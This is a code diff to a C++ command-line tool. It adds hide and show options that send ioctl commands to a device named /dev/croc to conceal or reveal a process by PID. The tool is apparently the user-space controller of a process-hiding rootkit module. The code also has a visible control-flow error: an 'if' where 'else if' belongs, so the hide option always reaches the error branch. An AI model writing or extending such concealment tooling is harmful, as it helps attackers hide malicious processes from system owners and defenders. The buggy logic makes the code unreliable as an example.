@@ -22,13 +22,26 @@
  * THE SOFTWARE.
  */
 
+#include <fcntl.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+
 #include <iostream>
 
 #include "progopts/progopts.h"
 
+#define MODULE_NAME         "croc"
+#define DEVICE_PATH         "/dev/" MODULE_NAME
+#define CROC_IOC_HIDE_PID   0x40046B05
+#define CROC_IOC_SHOW_PID   0x40046B06
+
 int main(int argc, char* argv[])
 {
     wstux::po::prog_opts po;
+    po.insert<int>("-p,--pid", "Perform an action on the specified process.");
+    po.insert("-d,--hide", false, "Hide process or module.");
+    po.insert("-s,--show", false, "Show process or module.");
     po.insert("-h,--help", false, "Print this message.");
 
     if (! po.parse(argc, argv)) {
@@ -42,6 +55,32 @@ int main(int argc, char* argv[])
         return EXIT_SUCCESS;
     }
 
-    return EXIT_SUCCESS;
+    unsigned int cmd;
+    unsigned long arg;
+    if (po.value<bool>("--hide") && po.has_value("--pid")) {
+        cmd = CROC_IOC_HIDE_PID;
+        arg = po.value<int>("--pid");
+    } if (po.value<bool>("--show") && po.has_value("--pid")) {
+        cmd = CROC_IOC_SHOW_PID;
+        arg = po.value<int>("--pid");
+    } else {
+        std::cerr << "Invalid input parameters." << std::endl;
+        std::cout << po.usage() << std::endl;
+        return EXIT_FAILURE;
+    }
+
+    const int fd = ::open(DEVICE_PATH, O_RDWR);
+    if (fd == -1) {
+        std::cerr << "Could not open " DEVICE_PATH ". Reason: '"
+                  << ::strerror(errno) << "'." << std::endl;
+        return EXIT_FAILURE;
+    }
+
+    int rc = EXIT_SUCCESS;
+    if (::ioctl(fd, cmd, arg) < 0) {
+        rc = EXIT_FAILURE;
+    }
+    ::close(fd);
+    return rc;
 }
 
